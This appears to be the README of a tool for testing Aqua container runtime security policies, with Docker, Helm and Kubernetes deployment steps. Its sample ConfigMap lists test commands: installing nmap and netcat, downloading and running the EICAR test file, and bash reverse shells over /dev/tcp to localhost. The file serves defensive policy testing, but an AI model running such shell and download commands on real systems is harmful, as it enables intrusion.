# Aqua-Runtime-Tester
App that allows to experiment with the Aqua Container Runtime policy controls.<br>
Ammend the commands.json with your bash commands accordingly.


In __Docker__ do
```[bash]
docker run --rm --name aqua-runtime-tester -p 3000:3000 mulan04/aqua-runtime-tester:latest
```
which will expose the UI to http://localhost:3000/

---
To deploy in __K8s__ using __helm__ do
```[bash]
helm install --create-namespace --namespace aqua-runtime-tester aqua-runtime-tester https://github.com/mulan04/Aqua-Runtime-Tester/raw/main/helm/aqua-runtime-tester.tgz
```

---
To deploy in __K8s__ using __manifests__ do
```[bash]
kubectl create deployment aqua-runtime-tester --image=mulan04/aqua-runtime-tester
```
and to expose the deployment
```[bash]
kubectl expose deployment aqua-runtime-tester --type=LoadBalancer --port=3000
```
or
```[bash]
cat << EOF | kubectl apply -f -
kind: Service
apiVersion: v1
metadata:
  name: aqua-runtime-tester
spec:
  selector:
    app: aqua-runtime-tester
  ports:
  - protocol: TCP
    port: 3000
    targetPort: 3000
EOF
```
If you use minikube then the Aqua-Runtime-Tester UI is on 
```[bash]
minikube service list --namespace default --output='json' | jq -r '.[] | select(.Name == "aqua-runtime-tester").URLs[0]'
```

To get the output of the executed commands
```[bash]
kubectl logs -f $(kubectl get pods | grep aqua-runtime-tester | awk '{print $1}') 
```

To update the commands without rebuilding the image use a ConfigMap
```[bash]
cat << EOF | kubectl apply -f -
kind: ConfigMap
apiVersion: v1
metadata:
  name: aqua-runtime-tester-config
data:
    commands.json : |
        [
            {
                "label": "Drift Prevention (installing nmap and nc)",
                "command": "apt update && apt install nmap netcat-traditional -y"
            },
            {
                "label": "Executables Blocked (running nmap)",
                "command": "if [[ -f /usr/bin/nmap ]]; then nmap localhost; fi"
            },
            {
                "label": "AMP (installing EICAR)",
                "command": "curl https://secure.eicar.org/eicar.com -o /eicar.com  && chmod +x /eicar.com  && cat /eicar.com"
            },
            {
                "label": "Reverse Shell (to local listener)",
                "command": "bash -i >& /dev/tcp/localhost/3000 0>&1"
            },
            {
                "label": "Reverse Shell (using nc)",
                "command": "(nc -l -p 8888 &); sleep 1 ; bash -i >& /dev/tcp/localhost/8888 0>&1"
            },
            {
                "label": "kill Reverse Shell",
                "command": "pkill -ecf nc"
            }
        ]
EOF
```
and patch the deployment accordingly
```[bash]
kubectl patch deployment aqua-runtime-tester -p '{"spec":{"template":{"spec":{"volumes":[{"name":"aqua-runtime-tester-config","configMap":{"name":"aqua-runtime-tester-config"}}],"containers":[{"name":"aqua-runtime-tester","volumeMounts":[{"name":"aqua-runtime-tester-config","mountPath":"/app/config"}]}]}}}}'
```